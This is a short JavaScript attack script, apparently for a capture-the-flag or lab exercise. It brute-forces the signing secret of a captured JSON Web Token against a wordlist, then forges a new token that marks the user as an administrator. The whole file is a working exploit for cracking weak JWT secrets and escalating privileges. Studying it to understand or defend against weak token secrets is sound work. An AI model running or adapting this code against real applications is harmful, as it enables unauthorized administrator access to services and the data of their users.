import chalk from 'chalk';
import fs from 'fs';
import jwt from 'jsonwebtoken';

var wordlist = fs.readFileSync('wordlist.txt').toString().split("\n");
var token = fs.readFileSync('token').toString();

let secKey;

for (let i in wordlist) {
  let key = wordlist[i];
  try {
    username = jwt.verify(token, key).username;
    console.log(chalk.green(key));
    secKey = key;
  } catch {
    console.log(chalk.red(key));
  }
}


const adminToken = jwt.sign({ username: username, isAdmin: true }, secKey, { expiresIn: '1800s' });
console.log("\n\n\nYour token is:\n"+ chalk.green(adminToken)+"\n\n");